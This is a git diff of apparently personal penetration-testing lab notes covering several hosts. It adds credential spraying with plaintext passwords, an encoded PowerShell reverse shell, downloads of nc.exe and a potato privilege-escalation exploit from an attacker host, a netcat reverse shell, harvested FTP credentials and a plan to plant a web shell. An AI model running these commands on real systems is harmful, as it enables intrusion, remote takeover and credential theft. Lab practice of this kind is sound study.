@@ -92,6 +92,7 @@ python2 ./vncpasswd.py --decrypt 59A04800B111ADB060 --hex
 python2 ./vncpasswd.py --decrypt BFE825DE515A335BE3 --hex
 # R3S3+rcH
 ```
+
 .220 privesc
 ```bash
 # we have SeImpersonate
@@ -733,7 +734,7 @@ Sub MyMacro()
 End Sub
 ```
 
-.222
+.222 (paris)
 ```bash
 nmap 192.168.213.222
 sudo nmap -sU --open -p 161 192.168.213.222
@@ -746,8 +747,26 @@ nmap -v -p 139,445 --script smb-os-discovery 192.168.213.222
 smbclient -L 192.168.213.222
 smbmap -H 192.168.213.222
 
-crackmapexec winrm 192.168.186.222 -u backup_service -p pIt4Server --continue-on-success --local-auth
-impacket-psexec -hashes :17add237f30abaecc9d884f72958b928 Administrator@192.168.186.222
+# got the password from 250 (local admin)
+crackmapexec smb 192.168.194.222 -u Administrator -p MusingExtraCounty98 --continue-on-success --local-auth
+
+crackmapexec smb 192.168.194.222 -u Administrator -p 'MusingExtraCounty98' -X "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA5ACIALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" --local-auth
+
+Get-Childitem -recurse -filter "local.txt" -ErrorAction SilentlyContinue
+Get-Childitem -recurse -filter "proof.txt" -ErrorAction SilentlyContinue
+
+iwr -uri http://192.168.45.229/efspotato.cs -Outfile efspotato.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs
+iwr -uri http://192.168.45.229/nc.exe -Outfile nc.exe
+
+.\efspotato.exe "nc.exe 192.168.45.229 9999 -e cmd"
+
+# obtain creds for umbraco (226)
+FTP credentials for umbraco web application upgrade:
+
+ftp_jp
+~be<3@6fe1Z:2e8
+
 ```
 
 .223 (milan) (standalone)
@@ -1002,6 +1021,32 @@ crackmapexec smb 192.168.194.226 -u Administrator -p MusingExtraCounty98 --conti
 crackmapexec smb 192.168.194.226 -u backup_service -p 'It4Server' -X "whoami"
 
 sudo nmap -p- -Pn 192.168.194.226 -sS -T 5 --verbose
+
+# ports: 24680,2994,24621,445,5985
+nmap -sT -A -p 24680,2994,24621 192.168.194.226
+
+192.168.194.226:24680
+
+feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.194.226:24680v --filter-status 404
+
+# find login page here
+http://192.168.194.226:24680/umbraco/default
+
+# obtain FTP creds from 222
+FTP credentials for umbraco web application upgrade:
+
+ftp_jp
+~be<3@6fe1Z:2e8
+
+ftp ftp_jp@192.168.194.226 -p 24621
+
+# add shell to 
+/umbraco/bin/Debug/net6.0/publish/wwwroot
+
+
 ```
 
 .227 (192)
+```bash
+
+```
